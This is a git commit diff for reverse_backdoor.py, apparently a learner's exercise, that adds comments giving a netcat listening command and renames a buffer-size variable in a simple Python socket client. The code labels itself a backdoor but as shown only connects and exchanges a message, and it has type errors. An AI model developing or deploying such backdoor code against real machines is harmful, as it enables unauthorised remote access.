34c2445d8687346c1c4331aa4b7ae51142f8ed5b
syntax-eror <46492218+syntax-eror@users.noreply.github.com>
2019-07-31 15:42:20 -0700

    Update reverse_backdoor.py

--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -2,17 +2,20 @@
 
 import socket
 
+#open listening connection on target computer
+#nc -vv -l -p 4444
+#netcat --verbose -listen -port ####
 
 ip = input("Enter IP Address: ")
 port = input("Enter port number to use: ")
-buffersize = input("Enter buffer size: ")
+buffer_size = input("Enter buffer size: ")
 
 connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
 #takes two args - 1 - address family, 2 - socket type
 
 connection.connect((ip, port)) #connect method from connection variable
 connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string
-received_data = connection.recv(buffersize) #receive, specify buffer size
+received_data = connection.recv(buffer_size) #receive, specify buffer size
 print(received_data)
 connection.close()
 #connect method takes a tuple
@@ -22,7 +25,7 @@ connection.close()
 
 
 
-###
+###Commented code below###
 #!/usr/bin/env python3
 
 import socket
